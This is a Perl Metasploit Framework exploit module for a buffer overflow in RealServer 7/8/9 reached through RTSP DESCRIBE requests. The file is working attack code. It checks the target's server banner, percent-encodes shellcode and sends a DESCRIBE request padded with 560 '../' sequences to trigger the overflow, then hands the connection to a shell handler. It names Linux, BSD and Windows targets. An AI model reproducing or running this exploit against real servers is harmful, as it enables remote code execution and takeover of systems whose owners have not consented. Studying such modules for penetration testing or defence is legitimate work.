package Msf::Exploit::realserver_describe_linux;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'RealServer Describe Buffer Overflow',
    'Version'  => '$Revision: 1.14 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux', 'bsd', 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The RTSP port', 554],
                   },
                
    'Payload' => {
                    'Space'      => 2000,
                    'BadChars'  => "\x00\x0a\x0d\x25\x2e\x2f\x5c\xff :&?.=",

                 },
    
    'Description'  => qq{
        This module exploits a buffer overflow in RealServer 7/8/9 and was based
        on Johnny Cyberpunk's THCrealbad exploit. This code should reliably exploit
        Linux, BSD, and Windows-based servers.
    },
                
    'Refs'  =>  [  
                    'http://www.osvdb.org/4468',
		            'http://lists.immunitysec.com/pipermail/dailydave/2003-August/000030.html'
                ],
    'DefaultTarget' => 0,
    'Targets' => [['Universal Target :)']],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $s = Msf::Socket->new();

    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Error: " .$s->GetError());
        return(0);
    }
    $s->Send("OPTIONS / RTSP/1.0\r\n\r\n");
    
    my $res = $s->Recv(-1, 5);
    $s->Close();
    
    if ($res =~ m/^Server:([^\n]+)/sm)
    {
        my $svr = $1;
        $svr =~ s/(^\s+|\r|\s+$)//g;
        $self->PrintLine("[*] $svr");
        return(1);
    }
    return(0);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    $self->PrintLine("[*] RealServer universal exploit launched against $target_host");
    $self->PrintLine("[*] Kill the master rmserver pid to prevent shell disconnect");
    
    my $encoded;
    foreach (split(//, $shellcode)){ $encoded .= sprintf("%%%.2x", ord($_)) }

    my $req = "DESCRIBE /". ("../" x 560)  . "\xcc\xcc\x90\x90". $encoded. ".smi RTSP/1.0\r\n\r\n";  
    
    my $s = Msf::Socket->new();

    if (! $s->Tcp($target_host, $target_port, $self->GetVar('CPORT')))
    {
        $self->PrintLine("[*] ". $s->GetError());
        return;
    }
    $s->Send($req);
    
    $self->Handler($s->GetSocket);

    return;
}



